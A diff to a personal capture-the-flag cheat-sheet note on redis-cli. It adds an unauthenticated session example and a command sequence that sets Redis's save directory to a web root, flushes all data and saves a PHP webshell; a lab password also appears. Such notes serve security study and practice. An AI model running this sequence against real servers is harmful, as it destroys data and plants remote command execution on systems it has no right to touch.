@@ -1,6 +1,6 @@
 # redis-cli
 
-Command-line client for Redis. Used to authenticate against `requirepass`-protected instances, enumerate keys and read every data type, including lists that stash credentials.
+Command-line client for Redis. Used to authenticate against `requirepass`-protected instances, enumerate keys, read every data type, and abuse writable Redis snapshots when the service can write into a web root.
 
 ## Commands Used
 
@@ -10,6 +10,15 @@ Command-line client for Redis. Used to authenticate against `requirepass`-protec
 redis-cli -h $TARGET -a 'B65Hx562F@ggAZ@F'
 ```
 Used on: **VulnNet: Internal**
+
+### Unauthenticated interactive session
+<!-- cmd: linux -->
+```bash
+redis-cli -h $TARGET -p 6379
+INFO
+CONFIG GET dir
+```
+Used on: **res**
 
 Flags:
 - `-h` — remote host
@@ -55,6 +64,18 @@ LRANGE "authlist" 0 -1
 Used on: **VulnNet: Internal**
 
 returned a base64 blob  rsync credentials.
+
+### Write a PHP webshell through Redis snapshotting
+<!-- cmd: redis -->
+```text
+CONFIG SET dir /var/www/html
+FLUSHALL
+SET shell "<?php system($_GET['cmd']); ?>"
+SAVE
+```
+Used on: **res**
+
+See [redis-webroot-webshell.md](../../exploits/network-services/redis-webroot-webshell.md).
 
 ## Typed reads cheat sheet
 
